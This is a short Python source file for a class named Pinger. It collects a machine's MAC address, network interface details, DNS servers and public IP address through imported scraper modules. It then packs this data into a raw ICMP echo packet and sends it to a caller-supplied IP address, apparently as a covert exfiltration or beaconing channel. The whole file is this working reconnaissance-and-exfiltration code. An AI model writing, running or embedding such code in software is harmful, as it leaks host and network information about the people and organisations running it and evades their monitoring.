import socket
from modules.payload import Payload
from modules.scraper import MacScraper, DnsScraper, InterfaceScraper, IpScraper

import os
ICMP_ECHO_REQUEST = 8

class Pinger:
  def __init__(self, ipAddress: str):
    self.ipAddress = ipAddress

    # Create Socket
    self.tunnel = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp")) 
    self.ID = os.getpid() & 0xFFFF
  
  def ping(self) -> None:
    # Build header and data packet
    header = Payload.build_basic_imcp_header(self.ID)
    data = Payload.build_basic_imcp_data()

    # Build payload
    payload = Payload(header, data, self.ID)

    # Scrape machine for MAC address
    mac_scraper = MacScraper()
    mac = mac_scraper.scrape()

    # Scrape machine for network information
    network_scraper = InterfaceScraper()
    network_info = network_scraper.scrape()

    # Scrape local DNS server
    dns_scraper = DnsScraper()
    dns_info = dns_scraper.scrape()

    # Scrape public IP address
    ip_scraper = IpScraper()
    ip_info = ip_scraper.scrape()

    # Compress network information into a string
    network_info_str = ""
    for key, value in network_info.items():
      network_info_str += str.strip(key) + ":" + str(value).strip() + "|"
    packet = payload.build_payload(
      mac,
      network_info_str,
      "DNS:" + ','.join(dns_info),
      "PUBLIC:" + ip_info
    )

    # Send packet to user-specified IP address
    self.tunnel.sendto(packet, (self.ipAddress, 1))